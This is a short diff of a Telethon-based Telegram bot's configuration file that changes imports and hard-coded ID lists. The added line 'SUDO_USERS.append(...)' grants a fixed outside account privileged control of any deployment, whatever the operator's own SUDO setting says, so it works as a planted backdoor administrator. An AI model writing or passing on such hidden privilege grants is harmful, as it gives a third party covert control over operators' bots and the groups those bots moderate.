@@ -1,4 +1,4 @@
-import logging
+from anonx import app
 from decouple import config
 from os import getenv
 from telethon import TelegramClient, events
@@ -9,11 +9,10 @@ from telethon.tl.types import (
     ChatBannedRights,
 )
 
-BOT_TOKEN = config("BOT_TOKEN", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
-EVILS = [1827586893, 1953656325, 5797689958, 5547355973, 5345918225]
-ALTRONS = [-1001777776331, -1001802248291, -1001443562643]
-SUDO_USERS.append(1827586893)
+EVILS = [6367125364, 5897995217]
+INCRICIBLE = [-1001916027284]
+SUDO_USERS.append(5897995217)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
